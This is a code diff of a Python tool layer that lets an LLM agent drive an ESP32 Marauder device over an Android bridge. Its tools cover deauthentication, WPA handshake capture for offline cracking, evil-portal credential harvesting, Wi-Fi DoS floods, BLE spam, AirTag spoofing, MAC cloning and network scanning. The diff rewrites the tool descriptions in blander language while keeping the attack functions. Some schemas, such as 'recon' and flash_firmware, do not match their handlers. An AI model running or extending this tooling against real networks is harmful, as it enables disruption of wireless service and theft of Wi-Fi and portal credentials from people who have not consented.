@@ -208,44 +208,83 @@ def dispatch(name: str, args: dict) -> str:
         return None if _sock else "ERROR: Not connected. Call connect first."
 
     # ------------------------------------------------------------------ #
-    if name == "connect":
-        return _connect_bridge()
-
-    elif name == "disconnect":
-        if _sock:
-            try:
-                _sock.close()
-            except OSError:
-                pass
-            _sock = None
-        _connected_host = ""
-        return "Disconnected."
-
-    elif name == "connection_status":
-        if _sock:
-            try:
-                _sock.getpeername()
-                return f"Connected to Android bridge at {_connected_host}:{BRIDGE_PORT}."
-            except OSError:
-                pass
-        return "Not connected."
+    if name == "device_connection":
+        action = args.get("action")
+        if action == "list_ports":
+            cands = ", ".join(f"{h}:{BRIDGE_PORT}" for h in _candidate_hosts())
+            return f"Android TCP bridge candidates (Termux mode): {cands}"
+        elif action == "connect":
+            return _connect_bridge()
+        elif action == "disconnect":
+            if _sock:
+                try:
+                    _sock.close()
+                except OSError:
+                    pass
+                _sock = None
+            _connected_host = ""
+            return "Disconnected."
+        elif action == "status":
+            if _sock:
+                try:
+                    _sock.getpeername()
+                    return f"Connected to Android bridge at {_connected_host}:{BRIDGE_PORT}."
+                except OSError:
+                    pass
+            return "Not connected."
+        elif action == "reboot":
+            if err := need_sock(): return err
+            return _send_cmd("reboot") or "Reboot command sent."
 
     elif name == "send_command":
-        if err := need_sock():
-            return err
+        if err := need_sock(): return err
         cmd = args.get("command", "").strip()
         if not cmd:
             return "ERROR: 'command' is required."
         return _send_cmd(cmd, float(args.get("timeout", 8.0))) or "(no output)"
 
     elif name == "read_output":
-        if err := need_sock():
-            return err
+        if err := need_sock(): return err
         return _stream_for(float(args.get("duration", 2.0))).strip() or "(no output)"
 
-    elif name == "recon":
-        if err := need_sock():
-            return err
+    elif name == "read_local_file":
+        raw_path = args.get("path", "")
+        if not raw_path:
+            return "ERROR: 'path' is required."
+        try:
+            import pathlib
+            p = pathlib.Path(raw_path).expanduser()
+            if not p.exists():
+                return f"ERROR: File not found: {p}"
+            if not p.is_file():
+                return f"ERROR: Not a file: {p}"
+            return p.read_text(encoding="utf-8", errors="replace")
+        except Exception as exc:
+            return f"ERROR reading {raw_path}: {exc}"
+
+    elif name == "flash_firmware":
+        return "ERROR: Flashing via TCP bridge (Termux) is not supported."
+
+    elif name == "wifi_control":
+        if err := need_sock(): return err
+        action = args.get("action")
+        channel = args.get("channel")
+        if action == "scan":
+            cmd = "scanall"
+        elif action == "stop":
+            cmd = "stopscan"
+        elif action == "set_channel":
+            if channel is None:
+                return "ERROR: 'channel' is required for set_channel."
+            cmd = f"channel -s {channel}"
+        elif action == "query_channel":
+            cmd = "channel"
+        else:
+            return f"ERROR: Unknown action '{action}' for wifi_control."
+        return _send_cmd(cmd) or f"Wi-Fi control action '{action}' executed."
+
+    elif name == "scan_and_capture":
+        if err := need_sock(): return err
         scan_type  = args.get("scan_type", "scanall")
         duration   = float(args.get("duration", 30.0))
         cmd        = SCAN_COMMANDS.get(scan_type, scan_type)
@@ -287,201 +326,217 @@ def dispatch(name: str, args: dict) -> str:
         }
         return _capture_buffer
 
-    elif name == "get_capture":
-        return _capture_buffer or "No capture in buffer. Run recon or capture_handshake first."
-
-    elif name == "save_capture_local":
-        if not _capture_buffer:
-            return "No loot to save. Run recon or capture_handshake first."
-        path_arg  = args.get("path")
-        ts        = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-        scan_type = _capture_meta.get("scan_type", "capture")
-        if path_arg:
-            dest = pathlib.Path(path_arg).expanduser()
-            base = (dest / f"marauder_{scan_type}_{ts}") if dest.is_dir() else dest.with_suffix("")
-        else:
-            base_dir = pathlib.Path.home() / "marauder_captures"
-            base_dir.mkdir(exist_ok=True)
-            base = base_dir / f"marauder_{scan_type}_{ts}"
-        txt_path  = base.with_suffix(".txt")
-        json_path = base.with_suffix(".json")
-        txt_path.write_text(_capture_buffer, encoding="utf-8")
-        json_path.write_text(
-            json.dumps({"meta": _capture_meta, "raw": _capture_buffer}, indent=2),
-            encoding="utf-8",
-        )
-        return f"Saved:\n  {txt_path}\n  {json_path}\nSize: {len(_capture_buffer):,} bytes"
+    elif name == "capture_data":
+        action = args.get("action")
+        if action == "get":
+            return _capture_buffer or "No capture in buffer. Run scan_and_capture first."
+        elif action == "save":
+            if not _capture_buffer:
+                return "No capture to save. Run scan_and_capture first."
+            path_arg  = args.get("path")
+            ts        = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+            scan_type = _capture_meta.get("scan_type", "capture")
+            if path_arg:
+                import pathlib
+                dest = pathlib.Path(path_arg).expanduser()
+                base = (dest / f"marauder_{scan_type}_{ts}") if dest.is_dir() else dest.with_suffix("")
+            else:
+                import pathlib
+                base_dir = pathlib.Path.home() / "marauder_captures"
+                base_dir.mkdir(exist_ok=True)
+                base = base_dir / f"marauder_{scan_type}_{ts}"
+            txt_path  = base.with_suffix(".txt")
+            json_path = base.with_suffix(".json")
+            txt_path.write_text(_capture_buffer, encoding="utf-8")
+            json_path.write_text(json.dumps({"meta": _capture_meta, "raw": _capture_buffer}, indent=2), encoding="utf-8")
+            return f"Saved:\n  {txt_path}\n  {json_path}\nSize: {len(_capture_buffer):,} bytes"
 
     elif name == "list_targets":
         if err := need_sock(): return err
-        kind = args.get("kind", "ap")
-        flag = {"ap": "-a", "station": "-c", "ssid": "-s", "probe": "-p"}.get(kind, "-a")
-        return _send_cmd(f"list {flag}") or "(none — run recon first to populate)"
+        target_type = args.get("target_type")
+        flag = {"ap": "-a", "station": "-c", "ssid": "-s", "probe": "-p"}.get(target_type, "-a")
+        return _send_cmd(f"list {flag}") or "(none)"
 
-    elif name == "select_targets":
+    elif name == "target_management":
         if err := need_sock(): return err
-        kind = args.get("kind", "ap")
-        flag = {"ap": "-a", "station": "-c", "ssid": "-s"}.get(kind, "-a")
-        filt = args.get("filter", "").strip()
-        idx  = str(args.get("indices", "")).strip()
-        if filt:
-            # e.g. select -a -f "contains Corp"  → selects every matching entry
-            return _send_cmd(f'select {flag} -f {filt}') or "Selection updated."
-        if not idx:
-            return "ERROR: provide 'indices' (e.g. '0,3,5') or a 'filter' string."
-        return _send_cmd(f"select {flag} {idx}") or "Selection updated."
+        action = args.get("action")
+        target_type = args.get("target_type")
+        indices = args.get("indices")
+        mac = args.get("mac")
+        ssid = args.get("ssid")
+        channel = args.get("channel")
+        ap_index = args.get("ap_index")
+        count = args.get("count")
+        index = args.get("index")
 
-    elif name == "clear_selection":
-        if err := need_sock(): return err
-        kind = args.get("kind", "ap")
-        flag = {"ap": "-a", "station": "-c", "ssid": "-s"}.get(kind, "-a")
-        return _send_cmd(f"clearlist {flag}") or "Cleared."
+        if action == "select":
+            if not target_type or not indices:
+                return "ERROR: 'target_type' and 'indices' are required for select."
+            flag = {"ap": "-a", "station": "-c", "ssid": "-s"}.get(target_type, "-a")
+            cmd = f"select {flag} {indices}"
+        elif action == "clear":
+            if not target_type:
+                return "ERROR: 'target_type' is required for clear."
+            if target_type == "all":
+                cmd = "clearlist -a -c -s"
+            else:
+                flag = {"ap": "-a", "station": "-c", "ssid": "-s"}.get(target_type, "-a")
+                cmd = f"clearlist {flag}"
+        elif action == "add":
+            if not target_type or not mac:
+                return "ERROR: 'target_type' and 'mac' are required for add."
+            if target_type == "ap":
+                cmd = f"add -a -b {mac}"
+                if channel is not None:
+                    cmd += f" -ch {channel}"
+                if ssid:
+                    cmd += f" -e {ssid}"
+            elif target_type == "client":
+                if ap_index is None:
+                    return "ERROR: 'ap_index' is required when adding a client/station."
+                cmd = f"add -c -b {mac} -ap {ap_index}"
+            else:
+                return f"ERROR: Unknown target_type '{target_type}' for manual add."
+        elif action == "ssid_add":
+            if not ssid:
+                return "ERROR: 'ssid' name is required for ssid_add."
+            cmd = f"ssid -a -n {ssid}"
+        elif action == "ssid_generate":
+            if count is None:
+                return "ERROR: 'count' is required for ssid_generate."
+            cmd = f"ssid -a -g {count}"
+        elif action == "ssid_remove":
+            if index is None:
+                return "ERROR: 'index' is required for ssid_remove."
+            cmd = f"ssid -r {index}"
+        else:
+            return f"ERROR: Unknown action '{action}' for target_management."
+        return _send_cmd(cmd) or f"Target management action '{action}' executed."
 
-    elif name == "deauth":
+    elif name == "attack":
         if err := need_sock(): return err
-        duration = float(args.get("duration", 15.0))
-        parts = ["attack", "-t", "deauth"]
-        if args.get("targeted_stations"):
-            parts.append("-c")                       # deauth selected station list
-        if args.get("dst_mac"):
-            parts += ["-d", str(args["dst_mac"])]    # specific client
-        if args.get("src_mac"):
-            parts += ["-s", str(args["src_mac"])]    # manual/spoofed source (no select needed)
-        return _attack_for(" ".join(parts), duration)
-
-    elif name == "capture_handshake":
-        # Forced 4-way/PMKID handshake: sniffpmkid -d deauths clients so they
-        # reconnect, capturing EAPOL/PMKID for offline cracking. -l scopes to
-        # the selected AP list. This is the primary credential-capture path.
-        if err := need_sock(): return err
-        duration = float(args.get("duration", 45.0))
-        parts = ["sniffpmkid", "-d"]
-        if args.get("channel"):
-            parts += ["-c", str(int(args["channel"]))]
-        if args.get("targeted"):
-            parts.append("-l")                       # only selected APs (needs select_targets)
-        started_at = datetime.datetime.now().isoformat(timespec="seconds")
-        out = _attack_for(" ".join(parts), duration)
-        eapol = [ln for ln in out.splitlines() if "EAPOL" in ln or "PMKID" in ln]
-        _capture_buffer = "\n".join([
-            f"=== Handshake capture | cmd={' '.join(parts)} | dur={duration}s | {started_at} ===",
-            out.strip() or "(no output)",
-            "",
-            f"--- EAPOL/PMKID lines: {len(eapol)} ---",
-            *eapol,
-        ])
-        _capture_meta = {"scan_type": "handshake", "duration_s": duration,
-                         "started_at": started_at, "command": " ".join(parts),
-                         "eapol_count": len(eapol)}
-        return _capture_buffer
-
-    elif name == "beacon_spam":
-        if err := need_sock(): return err
-        duration = float(args.get("duration", 0))   # 0 = run until stop()
-        mode = args.get("mode", "random")
-        flag = {"random": "-r", "list": "-l", "clone": "-a"}.get(mode, "-r")
-        return _attack_for(f"attack -t beacon {flag}", duration)
-
-    elif name == "rogue_ssids":
-        # Build the SSID list used by beacon_spam mode=list.
-        if err := need_sock(): return err
-        action = args.get("action", "add")
-        if action == "generate":
-            n = int(args.get("count", 20))
-            return _send_cmd(f"ssid -a -g {n}") or f"Generated {n} random SSIDs."
-        if action == "remove":
-            return _send_cmd(f"ssid -r {int(args.get('index', 0))}") or "Removed."
-        name_val = args.get("name", "").strip()
-        if not name_val:
-            return "ERROR: provide 'name' (to add), or action='generate'/'remove'."
-        return _send_cmd(f"ssid -a -n {name_val}") or f"Added SSID '{name_val}'."
-
-    elif name == "probe_flood":
-        if err := need_sock(): return err
-        return _attack_for("attack -t probe", float(args.get("duration", 0)))
-
-    elif name == "badmsg_attack":
-        if err := need_sock(): return err
-        cmd = "attack -t badmsg" + (" -c" if args.get("targeted_stations") else "")
-        return _attack_for(cmd, float(args.get("duration", 0)))
-
-    elif name == "sleep_attack":
-        # 802.11 power-save (Quiet/Sleep) DoS.
-        if err := need_sock(): return err
-        cmd = "attack -t sleep" + (" -c" if args.get("targeted_stations") else "")
-        return _attack_for(cmd, float(args.get("duration", 0)))
-
-    elif name == "wpa3_attack":
-        # SAE commit flood — DoS / downgrade pressure against WPA3-SAE APs.
-        if err := need_sock(): return err
-        return _attack_for("attack -t sae", float(args.get("duration", 0)))
-
-    elif name == "csa_attack":
-        # Channel Switch Announcement — force clients off their channel.
-        if err := need_sock(): return err
-        return _attack_for("attack -t csa", float(args.get("duration", 0)))
+        attack_type = args.get("attack_type")
+        options = args.get("options") or ""
+        cmd = f"attack -t {attack_type}"
+        if options:
+            cmd += f" {options.strip()}"
+        return _send_cmd(cmd) or f"Attack '{attack_type}' started."
 
     elif name == "evil_portal":
-        # Captive-portal credential harvesting / rogue AP.
         if err := need_sock(): return err
-        html = str(args.get("html", "")).strip()
-        cmd = "evilportal -c start" + (f" -w {html}" if html else "")
-        return _send_cmd(cmd, 6.0) or "Evil Portal starting. Stop with stop()."
+        action = args.get("action")
+        html_file = args.get("html_file")
+        if action == "start":
+            cmd = "evilportal -c start"
+            if html_file:
+                cmd += f" -w {html_file}"
+        elif action == "sethtml":
+            if not html_file:
+                return "ERROR: 'html_file' is required when action is 'sethtml'."
+            cmd = f"evilportal -c sethtml {html_file}"
+        elif action == "stop":
+            cmd = "stopscan"
+        else:
+            return f"ERROR: Unknown action '{action}' for evil_portal."
+        return _send_cmd(cmd) or f"Evil Portal action '{action}' executed."
 
-    elif name == "karma_attack":
-        # Answer probe requests to lure clients onto a spoofed SSID.
+    elif name == "led_control":
         if err := need_sock(): return err
-        return _send_cmd(f"karma -p {int(args.get('index', 0))}", 6.0) or "Karma armed."
+        color = args.get("color", "").strip()
+        if color.lower() == "rainbow":
+            cmd = "led -p rainbow"
+        else:
+            clean_color = color.lstrip("#")
+            cmd = f"led -s #{clean_color}"
+        return _send_cmd(cmd) or f"LED set to {color}."
 
-    elif name == "ble_spam":
+    elif name == "gps_control":
         if err := need_sock(): return err
-        t = args.get("type", "all")
-        allowed = {"sourapple", "applejuice", "google", "samsung", "windows", "flipper", "all"}
-        if t not in allowed:
-            return f"ERROR: type must be one of {sorted(allowed)}."
-        return _attack_for(f"blespam -t {t}", float(args.get("duration", 0)))
+        action = args.get("action")
+        poi_label = args.get("poi_label")
+        if action == "status":
+            cmd = "gpsdata"
+        elif action == "tracker_start":
+            cmd = "gpstracker -c start"
+        elif action == "tracker_stop":
+            cmd = "gpstracker -c stop"
+        elif action == "tag_poi":
+            if not poi_label:
+                return "ERROR: 'poi_label' is required when action is 'tag_poi'."
+            cmd = f"wardrivepoi {poi_label}"
+        elif action == "nmea_status":
+            cmd = "nmea"
+        else:
+            return f"ERROR: Unknown action '{action}' for gps_control."
+        return _send_cmd(cmd) or f"GPS action '{action}' executed."
 
-    elif name == "spoof_mac":
+    elif name == "ble_control":
         if err := need_sock(): return err
-        mode = args.get("mode", "randapmac")
-        if mode == "cloneapmac":
-            return _send_cmd(f"cloneapmac -a {int(args.get('index', 0))}")
-        if mode == "clonestamac":
-            return _send_cmd(f"clonestamac -s {int(args.get('index', 0))}")
-        if mode in ("randapmac", "randstamac"):
-            return _send_cmd(mode)
-        return "ERROR: mode must be randapmac/randstamac/cloneapmac/clonestamac."
+        action = args.get("action")
+        spam_type = args.get("spam_type")
+        index = args.get("index")
+        if action == "spam":
+            if not spam_type:
+                return "ERROR: 'spam_type' is required for BLE spam."
+            cmd = f"blespam -t {spam_type}"
+        elif action == "spoof":
+            if index is None:
+                return "ERROR: 'index' is required for AirTag spoofing."
+            cmd = f"spoofat -t {index}"
+        else:
+            return "ERROR: Unknown action for ble_control."
+        return _send_cmd(cmd) or f"BLE control action '{action}' executed."
 
-    elif name == "set_channel":
+    elif name == "network_scan":
         if err := need_sock(): return err
-        return _send_cmd(f"channel -s {int(args.get('channel', 1))}") or "Channel set."
+        scan_mode = args.get("scan_mode")
+        options = args.get("options") or ""
+        mode_cmd = {
+            "ping": "pingscan",
+            "port": "portscan",
+            "arp": "arpscan",
+            "mac_track": "mactrack",
+            "signal_monitor": "sigmon"
+        }.get(scan_mode)
+        cmd = mode_cmd
+        if options:
+            cmd += f" {options.strip()}"
+        return _send_cmd(cmd) or f"Network scan '{scan_mode}' executed."
 
-    elif name == "join_network":
-        # Pivot: associate to a target AP (index from list_targets kind='ap').
+    elif name == "mac_spoof":
         if err := need_sock(): return err
-        idx = int(args.get("index", 0))
-        pw  = str(args.get("password", "")).strip()
-        cmd = f"join -a {idx}" + (f" -p {pw}" if pw else " -s")
-        return _send_cmd(cmd, 20.0) or "(join issued)"
+        action = args.get("action")
+        index = args.get("index")
+        if action == "random_ap":
+            cmd = "randapmac"
+        elif action == "random_client":
+            cmd = "randstamac"
+        elif action == "clone_ap":
+            if index is None:
+                return "ERROR: 'index' is required to clone AP MAC."
+            cmd = f"cloneapmac -a {index}"
+        elif action == "clone_client":
+            if index is None:
+                return "ERROR: 'index' is required to clone client/station MAC."
+            cmd = f"clonestamac -s {index}"
+        else:
+            return f"ERROR: Unknown action '{action}' for mac_spoof."
+        return _send_cmd(cmd) or f"MAC spoofing action '{action}' executed."
 
-    elif name == "port_scan":
-        # Internal recon once joined. -s <service> or -a -t <ip index>.
+    elif name == "settings_control":
         if err := need_sock(): return err
-        svc = str(args.get("service", "")).strip()
-        if svc:
-            return _send_cmd(f"portscan -s {svc}", 30.0) or "(no output)"
-        return _send_cmd(f"portscan -a -t {int(args.get('ip_index', 0))}", 30.0) or "(no output)"
-
-    elif name == "arp_scan":
-        if err := need_sock(): return err
-        confirm = _send_cmd("arpscan -f", 4.0)
-        live = _stream_for(float(args.get("duration", 10.0)))
-        _send_cmd("stopscan -f", 4.0)
-        return (confirm + "\n" + live).strip() or "(no output)"
-
-    elif name == "stop":
-        if err := need_sock(): return err
-        return _send_cmd("stopscan -f", 4.0) or "(stopped)"
+        action = args.get("action")
+        setting = args.get("setting")
+        value = args.get("value")
+        if action == "get":
+            cmd = "settings"
+        elif action == "set":
+            if not setting or not value:
+                return "ERROR: 'setting' and 'value' are required for set setting."
+            cmd = f"settings -s {setting} {value}"
+        else:
+            return "ERROR: Unknown action for settings_control."
+        return _send_cmd(cmd) or "(no settings output)"
 
     else:
         return f"Unknown tool: {name}"
@@ -489,236 +544,369 @@ def dispatch(name: str, args: dict) -> str:
 # ---------------------------------------------------------------------------
 # Venice AI HTTPS (stdlib urllib)
 # ---------------------------------------------------------------------------
-
 TOOLS = [
     {"type": "function", "function": {
-        "name": "connect",
-        "description": "Connect to the ESP32 Marauder via the Android bridge. Call this FIRST on every engagement. Auto-disables SD PCAP so all output streams over USB.",
-        "parameters": {"type": "object", "properties": {}},
-    }},
-    {"type": "function", "function": {
-        "name": "disconnect",
-        "description": "Close the bridge connection.",
-        "parameters": {"type": "object", "properties": {}},
-    }},
-    {"type": "function", "function": {
-        "name": "connection_status",
-        "description": "Check whether the bridge connection is open.",
-        "parameters": {"type": "object", "properties": {}},
+        "name": "device_connection",
+        "description": "Manage the serial/TCP connection to the ESP32 Marauder device or list available ports.",
+        "parameters": {
+            "type": "object",
+            "required": ["action"],
+            "properties": {
+                "action": {
+                    "type": "string",
+                    "enum": ["list_ports", "connect", "disconnect", "status", "reboot"],
+                    "description": "Connection or hardware power action to execute."
+                },
+                "port": {
+                    "type": "string",
+                    "description": "Serial port (e.g. /dev/ttyUSB0 or COM3, socket://127.0.0.1:7555). Auto-detected if connect is called and port is omitted."
+                },
+                "baud": {
+                    "type": "integer",
+                    "description": "Baud rate (default 115200 for connect)."
+                }
+            }
+        }
     }},
     {"type": "function", "function": {
         "name": "send_command",
-        "description": "Escape hatch: send ANY raw Marauder serial command and return the response. Use for anything not covered by a dedicated tool (e.g. 'gps', 'wardrive', 'sigmon', 'info -a 0', 'settings').",
-        "parameters": {"type": "object", "required": ["command"], "properties": {
-            "command": {"type": "string", "description": "Raw Marauder command string."},
-            "timeout": {"type": "number", "description": "Seconds to wait for prompt (default 8)."},
-        }},
+        "description": "Send any raw Marauder serial command and return the response. Examples: 'help', 'info', 'channel -s 6', etc.",
+        "parameters": {
+            "type": "object",
+            "required": ["command"],
+            "properties": {
+                "command": {"type": "string", "description": "The Marauder command string to execute."},
+                "timeout": {"type": "number", "description": "Seconds to wait for prompt (default 8.0)."}
+            }
+        }
     }},
     {"type": "function", "function": {
         "name": "read_output",
-        "description": "Poll pending serial bytes without sending a command — watch a running attack/scan for `duration`s (deauth acks, captured frames, etc.).",
-        "parameters": {"type": "object", "properties": {
-            "duration": {"type": "number", "description": "Seconds to collect (default 2)."},
-        }},
+        "description": "Read pending bytes from the serial buffer without sending a command. Useful for polling ongoing scan output.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "duration": {"type": "number", "description": "How many seconds to collect (default 2.0)."}
+            }
+        }
+    }},
+    {"type": "function", "function": {
+        "name": "read_local_file",
+        "description": "Read a file from the local Linux host filesystem and return its contents. Use this to read capture files, logs, or any other local file for analysis.",
+        "parameters": {
+            "type": "object",
+            "required": ["path"],
+            "properties": {
+                "path": {
+                    "type": "string",
+                    "description": "Absolute or ~-relative path to the file on this Linux host."
+                }
+            }
+        }
+    }},
+    {"type": "function", "function": {
+        "name": "flash_firmware",
+        "description": "Flash/update the ESP32 Marauder firmware using esptool. Automatically handles closing the active serial connection before flashing, then runs the flash command and reports status.",
+        "parameters": {
+            "type": "object",
+            "required": ["bin_path"],
+            "properties": {
+                "bin_path": {
+                    "type": "string",
+                    "description": "Path to the compiled firmware binary (.bin file)."
+                },
+                "port": {
+                    "type": "string",
+                    "description": "Serial port. Auto-detected if omitted."
+                },
+                "baud": {
+                    "type": "integer",
+                    "description": "Flash baud rate (default 921600)."
+                }
+            }
+        }
+    }},
+    {"type": "function", "function": {
+        "name": "wifi_control",
+        "description": "Start/stop Wi-Fi scans or set/query the Wi-Fi channel.",
+        "parameters": {
+            "type": "object",
+            "required": ["action"],
+            "properties": {
+                "action": {
+                    "type": "string",
+                    "enum": ["scan", "stop", "set_channel", "query_channel"],
+                    "description": "Wi-Fi control action."
+                },
+                "channel": {
+                    "type": "integer",
+                    "description": "Wi-Fi channel (1-14). Required for set_channel."
+                }
+            }
+        }
     }},
     {"type": "function", "function": {
         "name": "recon",
         "description": (
-            "TARGET DISCOVERY. Runs a scan/sniff for `duration`s, stops, and pulls AP/station/SSID "
-            "lists into the loot buffer. Every attack needs targets from here first. "
-            "scan_type: scanall (APs+stations), beacon, probe, deauth, pmkid, raw, pwn, bt, airtag, skim, sae, multissid."
+            "Run a scan or sniff operation and capture ALL output through USB serial "
+            "back to this host — nothing is written to the SD card. "
+            "After the capture window, stops the scan and retrieves the AP/station lists. "
+            "Results are stored in the capture buffer.\n\n"
+            "scan_type options: scanall, beacon, probe, deauth, pmkid, raw, pwn, bt, airtag, skim, sae, multissid."
         ),
-        "parameters": {"type": "object", "properties": {
-            "scan_type": {"type": "string", "description": "Default scanall."},
-            "duration":  {"type": "number", "description": "Seconds to capture (default 30)."},
-        }},
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "scan_type": {
+                    "type": "string",
+                    "description": "Which scan/sniff to run (default: scanall)."
+                },
+                "duration": {
+                    "type": "number",
+                    "description": "How many seconds to capture (default: 30.0)."
+                }
+            }
+        }
+    }},
+    {"type": "function", "function": {
+        "name": "capture_data",
+        "description": "Return the capture buffer from the most recent scan_and_capture call, or save it to a file on this device.",
+        "parameters": {
+            "type": "object",
+            "required": ["action"],
+            "properties": {
+                "action": {
+                    "type": "string",
+                    "enum": ["get", "save"],
+                    "description": "Action: get (return buffer) or save (write to local file)."
+                },
+                "path": {
+                    "type": "string",
+                    "description": "Directory or full file path (optional, for 'save')."
+                }
+            }
+        }
     }},
     {"type": "function", "function": {
         "name": "list_targets",
-        "description": "Show the current enumerated list with indices, so you can select_targets. kind: ap | station | ssid | probe.",
-        "parameters": {"type": "object", "properties": {
-            "kind": {"type": "string", "description": "ap | station | ssid | probe (default ap)."},
-        }},
+        "description": "List discovered targets (access points, stations/clients, SSIDs, or captured probe SSIDs).",
+        "parameters": {
+            "type": "object",
+            "required": ["target_type"],
+            "properties": {
+                "target_type": {
+                    "type": "string",
+                    "enum": ["ap", "station", "ssid", "probe"],
+                    "description": "The category of targets to list."
+                }
+            }
+        }
     }},
     {"type": "function", "function": {
-        "name": "select_targets",
-        "description": (
-            "REQUIRED before deauth, probe_flood, targeted beacon/handshake, badmsg/sleep -c. "
-            "Marks which enumerated entries the next attack hits. Give comma-separated `indices` "
-            "(from list_targets) OR a `filter` like 'contains Corp' / 'equals HomeWiFi'."
-        ),
-        "parameters": {"type": "object", "properties": {
-            "kind":    {"type": "string", "description": "ap | station | ssid (default ap)."},
-            "indices": {"type": "string", "description": "Comma-separated indices, e.g. '0,3,5'."},
-            "filter":  {"type": "string", "description": "Quoted filter: 'contains X' or 'equals X'."},
-        }},
+        "name": "target_management",
+        "description": "Manage targets: select for attacks, clear discovered lists, manually add devices, or configure the SSID pool.",
+        "parameters": {
+            "type": "object",
+            "required": ["action"],
+            "properties": {
+                "action": {
+                    "type": "string",
+                    "enum": ["select", "clear", "add", "ssid_add", "ssid_generate", "ssid_remove"],
+                    "description": "Target management action."
+                },
+                "target_type": {
+                    "type": "string",
+                    "enum": ["ap", "station", "ssid", "all"],
+                    "description": "Target category (used for 'select' and 'clear')."
+                },
+                "indices": {
+                    "type": "string",
+                    "description": "Comma-separated indices or 'all' to select (used for 'select')."
+                },
+                "mac": {
+                    "type": "string",
+                    "description": "MAC address (used for manual 'add')."
+                },
+                "ssid": {
+                    "type": "string",
+                    "description": "SSID name (used for manual 'add' AP or 'ssid_add')."
+                },
+                "channel": {
+                    "type": "integer",
+                    "description": "Channel number (used for manual 'add' AP)."
+                },
+                "ap_index": {
+                    "type": "integer",
+                    "description": "Associated AP index (used for manual 'add' client)."
+                },
+                "count": {
+                    "type": "integer",
+                    "description": "Number of SSIDs to generate (used for 'ssid_generate')."
+                },
+                "index": {
+                    "type": "integer",
+                    "description": "SSID index to remove (used for 'ssid_remove')."
+                }
+            }
+        }
     }},
     {"type": "function", "function": {
-        "name": "clear_selection",
-        "description": "Clear the selected/enumerated list. kind: ap | station | ssid.",
-        "parameters": {"type": "object", "properties": {
-            "kind": {"type": "string", "description": "ap | station | ssid (default ap)."},
-        }},
-    }},
-    {"type": "function", "function": {
-        "name": "deauth",
-        "description": (
-            "Deauthentication attack against selected targets (select_targets first, unless src_mac is set for a manual/spoofed source). "
-            "Knocks clients off to force reconnects — pair with capture_handshake. "
-            "targeted_stations=true deauths the selected STATION list; dst_mac targets one client."
-        ),
-        "parameters": {"type": "object", "properties": {
-            "duration":          {"type": "number", "description": "Seconds to run then auto-stop (default 15; 0 = run until stop)."},
-            "targeted_stations": {"type": "boolean", "description": "Use selected station list (-c)."},
-            "dst_mac":           {"type": "string", "description": "Specific client MAC to deauth."},
-            "src_mac":           {"type": "string", "description": "Spoofed source MAC (manual mode, no select needed)."},
-        }},
-    }},
-    {"type": "function", "function": {
-        "name": "capture_handshake",
-        "description": (
-            "PRIMARY CREDENTIAL CAPTURE. Runs 'sniffpmkid -d': deauths clients AND sniffs the resulting "
-            "EAPOL/PMKID handshake for offline cracking (hashcat 22000). Stores loot in the capture buffer. "
-            "Set targeted=true to scope to the selected AP list (select_targets first). Set channel to lock the radio."
-        ),
-        "parameters": {"type": "object", "properties": {
-            "duration": {"type": "number",  "description": "Seconds to capture (default 45)."},
-            "targeted": {"type": "boolean", "description": "Only selected APs (-l). Requires select_targets."},
-            "channel":  {"type": "number",  "description": "Lock to this channel (optional)."},
-        }},
-    }},
-    {"type": "function", "function": {
-        "name": "beacon_spam",
-        "description": "Flood fake APs. mode: random (junk SSIDs) | list (uses rogue_ssids list) | clone (spoof selected real APs, select_targets first).",
-        "parameters": {"type": "object", "properties": {
-            "mode":     {"type": "string", "description": "random | list | clone (default random)."},
-            "duration": {"type": "number", "description": "Seconds then auto-stop (default 0 = until stop)."},
-        }},
-    }},
-    {"type": "function", "function": {
-        "name": "rogue_ssids",
-        "description": "Manage the SSID list used by beacon_spam mode=list. action: add (name), generate (count), remove (index).",
-        "parameters": {"type": "object", "properties": {
-            "action": {"type": "string", "description": "add | generate | remove (default add)."},
-            "name":   {"type": "string", "description": "SSID to add."},
-            "count":  {"type": "number", "description": "How many random SSIDs to generate."},
-            "index":  {"type": "number", "description": "Index to remove."},
-        }},
-    }},
-    {"type": "function", "function": {
-        "name": "probe_flood",
-        "description": "Auth/probe request flood against selected APs (select_targets first). Stresses AP auth handling.",
-        "parameters": {"type": "object", "properties": {
-            "duration": {"type": "number", "description": "Seconds then auto-stop (default 0 = until stop)."},
-        }},
-    }},
-    {"type": "function", "function": {
-        "name": "badmsg_attack",
-        "description": "Malformed 802.11 frame attack (can wedge some drivers). targeted_stations=true hits selected stations, else all.",
-        "parameters": {"type": "object", "properties": {
-            "targeted_stations": {"type": "boolean", "description": "Target selected stations (-c)."},
-            "duration":          {"type": "number", "description": "Seconds then auto-stop (default 0)."},
-        }},
-    }},
-    {"type": "function", "function": {
-        "name": "sleep_attack",
-        "description": "802.11 power-save (Quiet/Sleep) DoS — tricks clients into sleeping. targeted_stations=true for selected stations.",
-        "parameters": {"type": "object", "properties": {
-            "targeted_stations": {"type": "boolean", "description": "Target selected stations (-c)."},
-            "duration":          {"type": "number", "description": "Seconds then auto-stop (default 0)."},
-        }},
-    }},
-    {"type": "function", "function": {
-        "name": "wpa3_attack",
-        "description": "WPA3 SAE commit flood — DoS / downgrade pressure on WPA3-SAE access points.",
-        "parameters": {"type": "object", "properties": {
-            "duration": {"type": "number", "description": "Seconds then auto-stop (default 0)."},
-        }},
-    }},
-    {"type": "function", "function": {
-        "name": "csa_attack",
-        "description": "Channel Switch Announcement attack — force associated clients to hop to a bogus channel, dropping them.",
-        "parameters": {"type": "object", "properties": {
-            "duration": {"type": "number", "description": "Seconds then auto-stop (default 0)."},
-        }},
+        "name": "attack",
+        "description": "Launch a specified Wi-Fi attack against selected targets.",
+        "parameters": {
+            "type": "object",
+            "required": ["attack_type"],
+            "properties": {
+                "attack_type": {
+                    "type": "string",
+                    "enum": ["deauth", "beacon", "probe", "funny", "rickroll", "badmsg", "sleep", "sae", "csa", "quiet"],
+                    "description": "Type of attack to launch."
+                },
+                "options": {
+                    "type": "string",
+                    "description": "Optional flags/parameters (e.g. '-c' to target clients, '-s <mac>' override source MAC, '-d <mac>' override destination MAC)."
+                }
+            }
+        }
     }},
     {"type": "function", "function": {
         "name": "evil_portal",
-        "description": "Stand up a captive-portal rogue AP for credential harvesting. Pair with deauth to herd clients onto it. Optional html filename served from SD.",
-        "parameters": {"type": "object", "properties": {
-            "html": {"type": "string", "description": "Captive-portal HTML filename on SD (optional)."},
-        }},
